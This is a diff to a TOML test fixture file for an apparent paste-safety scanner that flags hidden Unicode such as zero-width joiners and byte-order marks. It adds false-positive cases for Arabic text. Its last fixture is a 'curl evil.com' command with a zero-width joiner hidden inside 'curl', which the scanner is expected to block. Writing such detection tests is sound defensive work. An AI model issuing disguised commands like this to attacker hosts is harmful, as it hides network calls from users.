@@ -99,8 +99,17 @@ name = "bom_in_paste"
 min_milestone = 1
 input = "\ufeffecho hello"
 context = "paste"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "bom_not_at_offset_zero"
+min_milestone = 3
+input = "echo hello"
+context = "paste"
 expected_action = "block"
 expected_rules = ["zero_width_chars"]
+raw_bytes = [101, 99, 104, 111, 32, 239, 187, 191, 104, 101, 108, 108, 111]
 
 [[fixture]]
 name = "clean_paste"
@@ -329,3 +338,32 @@ context = "paste"
 expected_action = "allow"
 expected_rules = ["variation_selector"]
 raw_bytes = [65, 243, 160, 132, 128]
+
+# ─── Part 3: FP reduction + OCR confusion ───
+
+[[fixture]]
+name = "zwj_in_arabic_text"
+min_milestone = 3
+input = "echo test"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [101, 99, 104, 111, 32, 217, 132, 226, 128, 141, 216, 167]
+
+[[fixture]]
+name = "zwnj_in_arabic_text"
+min_milestone = 3
+input = "echo test"
+context = "paste"
+expected_action = "allow"
+expected_rules = []
+raw_bytes = [101, 99, 104, 111, 32, 217, 133, 226, 128, 140, 217, 134]
+
+[[fixture]]
+name = "zwj_in_ascii_text"
+min_milestone = 3
+input = "curl evil.com"
+context = "paste"
+expected_action = "block"
+expected_rules = ["zero_width_chars"]
+raw_bytes = [99, 117, 114, 226, 128, 141, 108, 32, 101, 118, 105, 108, 46, 99, 111, 109]
